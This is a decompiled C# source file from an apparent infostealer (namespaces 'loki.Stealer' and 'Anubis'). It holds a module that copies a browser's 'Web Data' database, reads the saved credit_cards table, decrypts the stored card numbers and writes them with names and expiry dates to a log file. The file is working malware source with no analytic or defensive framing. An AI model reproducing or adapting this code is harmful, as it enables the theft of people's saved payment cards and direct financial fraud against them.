using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Anubis;
using loki.loki.Stealer.Cookies;

namespace loki.loki.Stealer.Credit_Cards
{
	// Token: 0x02000032 RID: 50
	internal class Get_Credit_Cards
	{
		// Token: 0x06000184 RID: 388 RVA: 0x0000AEAC File Offset: 0x000090AC
		public static void Get_CC(string profilePath, string Browser_Name, string Profile_Name)
		{
			try
			{
				SqlHandler sqlHandler = new SqlHandler(GetCookies.CreateTempCopy(Path.Combine(profilePath, "Web Data")));
				sqlHandler.ReadTable("credit_cards");
				int rowCount = sqlHandler.GetRowCount();
				for (int i = 0; i < rowCount; i++)
				{
					Get_Credit_Cards.CCCouunt++;
					try
					{
						string @string = Encoding.UTF8.GetString(DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(i, 4)), null));
						string value = sqlHandler.GetValue(i, 1);
						string value2 = sqlHandler.GetValue(i, 2);
						string value3 = sqlHandler.GetValue(i, 3);
						string value4 = sqlHandler.GetValue(i, 9);
						Get_Credit_Cards.CC.Add(string.Format("{0}\t{1}/{2}\t{3}\t{4}\r\n******************************\r\n", new object[]
						{
							value,
							value2,
							value3,
							@string,
							value4
						}));
					}
					catch
					{
					}
				}
				foreach (string text in Get_Credit_Cards.CC)
				{
					Get_Credit_Cards.CC_List.Add(string.Concat(new string[]
					{
						"Browser : ",
						Browser_Name,
						Environment.NewLine,
						"Profie : ",
						Profile_Name,
						Environment.NewLine,
						text
					}));
				}
				Get_Credit_Cards.CC.Clear();
			}
			catch
			{
			}
		}

		// Token: 0x06000185 RID: 389 RVA: 0x0000B050 File Offset: 0x00009250
		public static void Write_CC(string Browser_Name, string Profile_Name)
		{
			using (StreamWriter streamWriter = new StreamWriter(string.Concat(new string[]
			{
				Program.dir,
				"\\Browsers\\",
				Profile_Name,
				"_",
				Browser_Name,
				"_Credit_Cards.log"
			})))
			{
				foreach (string value in Get_Credit_Cards.CC_List)
				{
					streamWriter.WriteLine(value);
					streamWriter.WriteLine("\n");
				}
			}
		}

		// Token: 0x0400007C RID: 124
		public static List<string> CC_List = new List<string>();

		// Token: 0x0400007D RID: 125
		public static List<string> CC = new List<string>();

		// Token: 0x0400007E RID: 126
		public static int CCCouunt;
	}
}
